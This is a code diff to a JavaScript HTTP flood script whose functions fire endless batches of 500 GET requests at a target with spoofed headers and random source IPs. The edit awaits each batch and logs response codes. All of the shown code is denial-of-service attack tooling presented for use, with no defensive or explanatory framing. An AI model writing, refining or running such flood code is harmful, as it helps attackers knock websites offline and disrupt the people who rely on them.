@@ -36,12 +36,12 @@ function randomIP() {
 // Send one spoofed request
 async function sendSpoofedRequest(id) {
   try {
-    await axios.get(target, {
+    const response = await axios.get(target, {
       headers: getSpoofedHeaders(),
-      timeout: 10000,
-      validateStatus: () => true,
+      timeout: 10000, // 10 seconds timeout
+      validateStatus: (status) => status >= 200 && status < 400, // consider only 2xx & 3xx as successful
     });
-    console.log(`[#${id}] Request Sent`);
+    console.log(`[#${id}] Request Sent | Status: ${response.status}`);
   } catch (err) {
     console.error(`[#${id}] Error: ${err.message}`);
   }
@@ -50,16 +50,18 @@ async function sendSpoofedRequest(id) {
 // Raw flood function
 async function startFlood() {
   let count = 0;
-  
+
   while (true) {
     const batch = [];
 
     for (let i = 0; i < 500; i++) {
       count++;
-      batch.push(sendSpoofedRequest(count));
+      batch.push(sendSpoofedRequest(count));  // Add to batch
     }
 
-    Promise.allSettled(batch); // Don't wait
+    // Wait for all 500 requests to complete
+    await Promise.all(batch);  
+
     console.log(`> 500 Requests Fired! Total Sent: ${count}`);
   }
 }
